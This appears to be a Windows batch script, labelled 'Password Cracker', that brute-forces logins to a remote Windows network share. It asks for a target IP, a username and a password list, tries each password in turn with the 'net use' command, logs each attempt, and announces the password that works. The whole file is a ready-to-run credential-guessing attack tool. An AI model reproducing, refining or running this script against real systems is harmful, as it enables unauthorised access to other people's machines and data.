@echo off
title Password Cracker - by Ryan Shaar
color A
echo.
setlocal enabledelayedexpansion
set /p ip="Enter IP address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password list: "

set /a count=1
for /f "tokens=*" %%a in ('type "!wordlist!"') do (
    set "pass=%%a"
    call :attempt
)
echo Password not found :
pause
exit

:success
echo.
echo Password Found! !pass!
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% !pass! >nul 2>&1
echo [ATTEMPT !count!] [!pass!]
set /a count=!count!+1
if !errorlevel! EQU 0 goto success


